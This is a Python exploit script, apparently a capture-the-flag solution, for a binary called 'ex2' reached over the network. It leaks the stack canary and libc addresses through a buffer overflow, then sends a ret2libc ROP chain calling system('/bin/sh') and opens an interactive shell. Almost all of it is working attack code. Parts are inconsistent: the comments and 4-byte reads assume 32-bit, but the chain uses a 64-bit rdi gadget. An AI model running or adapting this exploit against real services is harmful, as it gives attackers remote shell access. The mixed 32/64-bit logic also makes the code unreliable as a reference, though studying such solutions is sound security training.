import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./ex2',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
pause()

print(elf.got)


plt_write = elf.plt['puts']
print(plt_write)
main_addr = elf.symbols['main']


canary = b''


def exp():
    # overflow position
    data = [b'a' * (136), canary, (b'' if not canary else fakeebp())]
    return data


# 此处是先获取canary，注意canary32位时候是 00开头的，需要将该00补上，否则将被截断无法回显
data = exp()
print(data)
sa('Hacker', data + b'a')
ru(data + b'a')
canary = rc(3).rjust(4, b'\0')
log.info(f'canary:{canary.hex()}')


def leak(func: str):
    log.info(f'leak:{func}')
    global canary
    # 泄露libc
    payload = exp()
    payload += [plt_write, main_addr, elf.got[func]]
    # 如果是read的话则sa，如果是gets scanf的话则sl
    se(payload)
    ru(b'aabb')
    data = rc(4)  # 32位接收4个
    data = uc(data)
    s.add_condition(func, data)
    print('leak', func, hex(data))
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
leak('__libc_start_main')
se('123')
ru(b'123') # 此处因为样本read了2次，需要跳过第一次
leak('puts')


# libc = ELF('libc_buu-2.23_x86.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset


data = s.dump(db_index=0)
# 再次利用payload，溢出执行system
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')


payload = exp()
payload += [elf.rop['ret']]  # 栈平衡
payload += [elf.rop['rdi'], binsh_addr]
payload += [system_addr]
sl(payload)
interactive()
